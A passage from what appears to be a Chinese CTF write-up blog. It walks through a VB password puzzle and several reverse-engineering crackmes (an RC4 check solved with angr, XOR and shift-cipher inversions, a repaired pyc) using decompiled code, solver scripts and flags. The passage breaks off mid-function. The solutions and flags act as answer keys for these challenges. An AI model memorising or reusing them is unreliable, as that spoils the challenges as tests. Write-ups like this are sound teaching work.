<span class="string">"PasswordFail!"</span>, vbOKOnly, <span class="string">"密码错误"</span></span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line">   <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   </span><br><span class="line">      </span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>

<p>我也不知道这是那种语言的代码，但是这种代码可读性很好</p>
<p>首先第一句话的意思就是定义一个函数，返回值是string类型，有一个str参数，类型也是string类型</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Function</span> getPassword(<span class="keyword">ByVal</span> str <span class="keyword">As</span> <span class="built_in">String</span>) <span class="keyword">As</span> <span class="built_in">String</span></span><br></pre></td></tr></table></figure>

<p>在函数内定义了一个string类型的变量dim，有定义了一个int类型的变量i，并对i进行了赋初值</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Dim</span> reString <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line"><span class="keyword">Dim</span> i <span class="keyword">As</span> <span class="built_in">Integer</span></span><br><span class="line">i = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>然后来了一个循环，在这个循环中，对变量reString进行字符串加操作，取出参数str的第i位，i的变化是i=i+(i%5)，然后将变量reString返回</p>
<p>Command1_Click函数中是有一个字符串，当做参数传到getPassword函数中，将返回的新字符串和正确字符串比较，若一致的话，压缩包的密码就是新字符串当做参数再次传到getPassword函数中的返回值</p>
<p>求密码：</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">"VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU="</span></span><br><span class="line">def getpassword(str1):</span><br><span class="line">  password=<span class="string">""</span></span><br><span class="line">  <span class="built_in">i</span>=<span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">i</span>&lt;=len(str1):</span><br><span class="line">    password+=str1[<span class="built_in">i</span><span class="number">-1</span>]</span><br><span class="line">    <span class="built_in">i</span>=<span class="built_in">i</span>+(<span class="built_in">i</span><span class="comment">%5)</span></span><br><span class="line">  <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line">print getpassword(getpassword(data))</span><br></pre></td></tr></table></figure>

<p>得出密码：</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VmH<span class="number">0</span>wW<span class="number">3</span>DZalB<span class="symbol">nmmSalV1</span>SYSGRr<span class="number">1</span>r<span class="number">3</span>jVYcFrHWkUUlhljkFzCbXaEKyaVJymT<span class="number">1</span>FlVT<span class="attr">VskVWhGtonaGU2</span>WWGhVXYol<span class="number">1</span>WVI<span class="number">1</span>F<span class="number">2</span>odFuk</span><br></pre></td></tr></table></figure>

<p>解压缩flag.zip之后发现图片打不开，用winhex打开发现flag</p>
<h4 id="flag：flag-Good-luck"><a href="#flag：flag-Good-luck" class="headerlink" title="flag：flag{Good luck!}"></a>flag：flag{Good luck!}</h4><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="reverse-签到"><a href="#reverse-签到" class="headerlink" title="reverse 签到"></a>reverse 签到</h3><p>win32可执行文件，无壳，拖入IDA，shift+f12就可以看到flag</p>
<h3 id="re-easy"><a href="#re-easy" class="headerlink" title="re_easy"></a>re_easy</h3><p>main函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please Enter Flag:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%24s"</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  sub_400686(s, v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; ___; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != ____[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Error Flag!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在加密函数sub_400686加密后与正确字符串进行比较</p>
<p>sub_400686函数，通过查看代码可以</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400686(__int64 a1, unsigned __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned<span class="built_in"> int </span>v2; // eax</span><br><span class="line">  unsigned __int8 v3; // ST1F_1</span><br><span class="line">  unsigned<span class="built_in"> int </span>v4; // eax</span><br><span class="line">  unsigned __int8 v5; // ST1F_1</span><br><span class="line">  unsigned<span class="built_in"> int </span>v6; // eax</span><br><span class="line">  unsigned __int64 result; // rax</span><br><span class="line">  unsigned<span class="built_in"> int </span>v8; // [rsp+20h] [rbp-20h]</span><br><span class="line"> <span class="built_in"> int </span>v9; // [rsp+24h] [rbp-1Ch]</span><br><span class="line"> <span class="built_in"> int </span>i; // [rsp+28h] [rbp-18h]</span><br><span class="line"> <span class="built_in"> int </span>v11; // [rsp+2Ch] [rbp-14h]</span><br><span class="line">  signed<span class="built_in"> int </span>j; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 k; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9 = 0;</span><br><span class="line">  for ( i = 0; i &lt;= 255; ++i )</span><br><span class="line">    _[i] = i;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  for ( j = 0; j &lt;= 255; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = ((_[j] + v11 + __[j % _]) &gt;&gt; 31) &gt;&gt; 24;</span><br><span class="line">    v11 = (v2 + LOBYTE(_[j]) + v11 + __[j % _]) - v2;</span><br><span class="line">    v3 = _[j];</span><br><span class="line">    _[j] = _[v11];</span><br><span class="line">    _[v11] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( k = 0<span class="class">LL;</span> ; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    result = k;</span><br><span class="line">   <span class="built_in"> if </span>( k &gt;= a2 )</span><br><span class="line">      break;</span><br><span class="line">    v8 = ((((v8 + 1) &gt;&gt; 31) &gt;&gt; 24) + v8 + 1) - (((v8 + 1) &gt;&gt; 31) &gt;&gt; 24);</span><br><span class="line">    v4 = ((v9 + _[v8]) &gt;&gt; 31) &gt;&gt; 24;</span><br><span class="line">    v9 = (v4 + v9 + LOBYTE(_[v8])) - v4;</span><br><span class="line">    v5 = _[v8];</span><br><span class="line">    _[v8] = _[v9];</span><br><span class="line">    _[v9] = v5;</span><br><span class="line">    v6 = ((_[v9] + _[v8]) &gt;&gt; 31) &gt;&gt; 24;</span><br><span class="line">    *(k + a1) = *(a1 + k) ^ LOBYTE(_[(v6 + LOBYTE(_[v9]) + LOBYTE(_[v8])) - v6]);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我的第一种方法就是angr自己跑出来flag</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> angr import *   											<span class="comment">#导入angr模块</span></span><br><span class="line">logging.getLogger('angr.manager').<span class="built_in">set</span>Level(logging.DEBUG)     	<span class="comment">#记录日志</span></span><br><span class="line">p = Project(<span class="string">"re1"</span>,auto_load_libs=False)                   <span class="comment">#加载目标文件,参数一是目标文件名，参数二是 是否自动加载依赖。</span></span><br><span class="line"><span class="keyword">state</span>=p.factory.entry_state()    								<span class="comment">#创建一个状态，默认是程序的入口地址，也可以指定地址作为入口地址：addr = 0x400000</span></span><br><span class="line">sm=p.factory.simulation_manager(<span class="keyword">state</span>) 							<span class="comment">#创建一个模拟器来模拟程序执行</span></span><br><span class="line">res=sm.explore(find=<span class="number">0</span>x40091D,avoid=<span class="number">0</span>x4008FA)  					<span class="comment">#执行模拟器，find和avoid参数来作为约束条件</span></span><br><span class="line">print len(res.found) 											<span class="comment">#查看执行后的结果有多少个</span></span><br><span class="line">print res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>out：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WARNING | <span class="number">2019</span><span class="number">-04</span><span class="number">-08</span> <span class="number">23</span>:<span class="number">31</span>:<span class="number">33</span>,<span class="number">700</span> | [<span class="number">34</span>mangr.analyses.disassembly_utils[<span class="number">0</span>m | [<span class="number">34</span>mYour <span class="built_in">version</span> <span class="keyword">of</span> capstone <span class="keyword">does</span> <span class="keyword">not</span> support MIPS instruction groups.[<span class="number">0</span>m</span><br><span class="line"><span class="number">1</span></span><br><span class="line">bdctf&#123;YOU_CRAKE_THE_RC4&#125;</span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">46.1</span>s]</span><br></pre></td></tr></table></figure>

<p>第二种方法就是劫持程序流程，在执行加密函数的时候提前把参数改成正确的加密后的字符串，然后函数返回值就是flag了，具体过程我就不再写了</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag_data = [<span class="number">0x62</span>,<span class="number">0x64</span>,<span class="number">0x63</span>,<span class="number">0x74</span>,<span class="number">0x66</span>,<span class="number">0x7b</span>,<span class="number">0x59</span>,<span class="number">0x4f</span>,<span class="number">0x55</span>,<span class="number">0x5f</span>,<span class="number">0x43</span>,<span class="number">0x52</span>,<span class="number">0x41</span>,<span class="number">0x4b</span>,<span class="number">0x45</span>,<span class="number">0x5f</span>,<span class="number">0x54</span>,<span class="number">0x48</span>,<span class="number">0x45</span>,<span class="number">0x5f</span>,<span class="number">0x52</span>,<span class="number">0x43</span>,<span class="number">0x34</span>,<span class="number">0x7d</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x in <span class="keyword">range</span>(<span class="built_in">len</span>(flag_data)):</span><br><span class="line">	flag+=chr(flag_data[x])</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>

<h4 id="flag-bdctf-YOU-CRAKE-THE-RC4"><a href="#flag-bdctf-YOU-CRAKE-THE-RC4" class="headerlink" title="flag: bdctf{YOU_CRAKE_THE_RC4}"></a>flag: bdctf{YOU_CRAKE_THE_RC4}</h4><h3 id="baby-reverse"><a href="#baby-reverse" class="headerlink" title="baby_reverse"></a>baby_reverse</h3><p>linux上64位可执行文件，</p>
<p>main函数，进入一个加密函数，把输入的字符串进行加密，再与正确字符串进行比较</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1E0h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+F0h] [rbp-F0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please Input Key: "</span>, <span class="number">0L</span>L);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;v5);</span><br><span class="line">  encode(&amp;v5, (__int64)&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s, enflag) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You are Right"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>encode函数：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall encode(const char *<span class="built_in">a1</span>, __int64 <span class="built_in">a2</span>)</span><br><span class="line">&#123;</span><br><span class="line">  char v3[<span class="number">32</span>]<span class="comment">; // [rsp+10h] [rbp-70h]</span></span><br><span class="line">  char v4[<span class="number">32</span>]<span class="comment">; // [rsp+30h] [rbp-50h]</span></span><br><span class="line">  char v5[<span class="number">36</span>]<span class="comment">; // [rsp+50h] [rbp-30h]</span></span><br><span class="line">  int v6<span class="comment">; // [rsp+74h] [rbp-Ch]</span></span><br><span class="line">  int len<span class="comment">; // [rsp+78h] [rbp-8h]</span></span><br><span class="line">  int i<span class="comment">; // [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  len = <span class="number">18</span><span class="comment">;</span></span><br><span class="line">  i = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">  v6 = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">  if ( strlen(<span class="built_in">a1</span>) != <span class="number">18</span> )</span><br><span class="line">    return puts(<span class="string">"Your Length is Wrong"</span>)<span class="comment">;</span></span><br><span class="line">  puts(<span class="string">"flag&#123;This_1s_f4cker_flag&#125;"</span>)<span class="comment">;</span></span><br><span class="line">  for ( i = <span class="number">0</span><span class="comment">; i &lt; len; i += 3 )</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] = len ^ (<span class="built_in">a1</span>[i] + <span class="number">6</span>)<span class="comment">;</span></span><br><span class="line">    v4[i + <span class="number">1</span>] = (<span class="built_in">a1</span>[i + <span class="number">1</span>] - <span class="number">6</span>) ^ len<span class="comment">;</span></span><br><span class="line">    v3[i + <span class="number">2</span>] = <span class="built_in">a1</span>[i + <span class="number">2</span>] ^ <span class="number">6</span> ^ len<span class="comment">;</span></span><br><span class="line">    *(_BYTE *)(<span class="built_in">a2</span> + i) = v5[i]<span class="comment">;</span></span><br><span class="line">    *(_BYTE *)(<span class="built_in">a2</span> + i + <span class="number">1</span>LL) = v4[i + <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">    *(_BYTE *)(<span class="built_in">a2</span> + i + <span class="number">2</span>LL) = v3[i + <span class="number">2</span>]<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  return <span class="built_in">a2</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把输入的字符串每三个分成一组，进行不同的运算，生成新字符串和正确字符串比较，那么我们可以通过正确的字符串反推出来应该输入的字符串</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">current = <span class="string">"bIwhroo8cwqgwrxusi"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">x</span> in range(<span class="number">0</span>,len(current),<span class="number">3</span>):</span><br><span class="line">	flag += <span class="keyword">chr</span>((<span class="keyword">ord</span>(current[<span class="keyword">x</span>])^<span class="number">18</span>)-<span class="number">6</span>)</span><br><span class="line">	flag += <span class="keyword">chr</span>((<span class="keyword">ord</span>(current[<span class="keyword">x</span>+<span class="number">1</span>])^<span class="number">18</span>)+<span class="number">6</span>)</span><br><span class="line">	flag += <span class="keyword">chr</span>((<span class="keyword">ord</span>(current[<span class="keyword">x</span>+<span class="number">2</span>])^<span class="number">18</span>)^<span class="number">6</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<h4 id="flag：jactf-w0w-is-flag"><a href="#flag：jactf-w0w-is-flag" class="headerlink" title="flag：jactf{w0w_is_flag}"></a>flag：jactf{w0w_is_flag}</h4><h3 id="py"><a href="#py" class="headerlink" title="py"></a>py</h3><p>下载下来的文件是一个pyc文件，有在线解密的网站，解密一波发现解密失败</p>
<p>在本地生成一个pyc文件</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> -<span class="keyword">m</span> <span class="number">1</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<p>把这两个文件都用winhex打开发现题目提供的pyc文件头少了4个字节的内容</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A50PWn.png" alt> </p>
<p>把缺少的4字节的数据填上去然后保存，再去解密就可以成功的转成py代码</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-]Please input your key:'</span></span><br><span class="line">key = raw_input()</span><br><span class="line">flag = <span class="string">"=Xm/&gt;*&lt;&amp;?*=+:)k)='@)&lt;.@-n)mZn.&lt;"</span></span><br><span class="line">flags = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">q</span> in range(len(key)):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">q</span> % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flags += <span class="keyword">chr</span>(<span class="keyword">ord</span>(key[<span class="keyword">q</span>]) + <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flags += <span class="keyword">chr</span>(<span class="keyword">ord</span>(key[<span class="keyword">q</span>]) - <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flags == flag:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-]Good!'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-]Wrong!'</span></span><br></pre></td></tr></table></figure>

<p>根据加密代码合一反推：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">current = <span class="string">"=Xm/&gt;*&lt;&amp;?*=+:)k)='@)&lt;.@-n)mZn.&lt;"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">x</span> in range(len(current)):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">x</span>%2==<span class="number">0</span>:</span><br><span class="line">		flag+=<span class="keyword">chr</span>(<span class="keyword">ord</span>(current[<span class="keyword">x</span>])-<span class="number">10</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		flag+=<span class="keyword">chr</span>(<span class="keyword">ord</span>(current[<span class="keyword">x</span>])+<span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<h4 id="flag-3bc94420543503a331632867d3cdd82"><a href="#flag-3bc94420543503a331632867d3cdd82" class="headerlink" title="flag:3bc94420543503a331632867d3cdd82"></a>flag:3bc94420543503a331632867d3cdd82</h4><h3 id="RE-crypto"><a href="#RE-crypto" class="headerlink" title="RE_crypto"></a>RE_crypto</h3><p>32位win可执行程序</p>
<p>main函数：限制输入的长度小于37，然后进入sub_401090函数进行验证</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">char</span> Buf; <span class="comment">// [esp+4h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+5h] [ebp-2Bh]</span></span><br><span class="line"></span><br><span class="line">  Buf = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x27</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome The System\nPlease Input Key:"</span>);</span><br><span class="line">  gets_s(&amp;Buf, <span class="number">40u</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;Buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 - <span class="number">35</span>) &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401090((<span class="keyword">int</span>)&amp;Buf, v3) == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Well Done!\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Your Wrong!\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_401090函数：限制了长度等于35，然后进行一系列的操作，每一位处理之后都和byte_4021A0中的值进行比较</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">signed<span class="built_in"> int </span>__fastcall sub_401090(int a1,<span class="built_in"> int </span>a2)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in"> int </span>v2; // ebx</span><br><span class="line"> <span class="built_in"> int </span>v4; // edx</span><br><span class="line">  char v5; // al</span><br><span class="line"> <span class="built_in"> int </span>v6; // esi</span><br><span class="line"> <span class="built_in"> int </span>v7; // edi</span><br><span class="line">  char v8; // al</span><br><span class="line"> <span class="built_in"> int </span>v9; // eax</span><br><span class="line">  char v10; // cl</span><br><span class="line"> <span class="built_in"> int </span>v11; // eax</span><br><span class="line"> <span class="built_in"> int </span>v12; // ecx</span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line"> <span class="built_in"> if </span>( a2 != 35 )</span><br><span class="line">   <span class="built_in"> return </span>-1;</span><br><span class="line">  v4 = 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *(_BYTE *)(v4 + v2);</span><br><span class="line">    v6 = (v5 &gt;&gt; 4) % 16;</span><br><span class="line">    v7 = (16 * v5 &gt;&gt; 4) % 16;</span><br><span class="line">    v8 = byte_402150[2 * v4];</span><br><span class="line">   <span class="built_in"> if </span>( v8 &lt; 48 || v8 &gt; 57 )</span><br><span class="line">      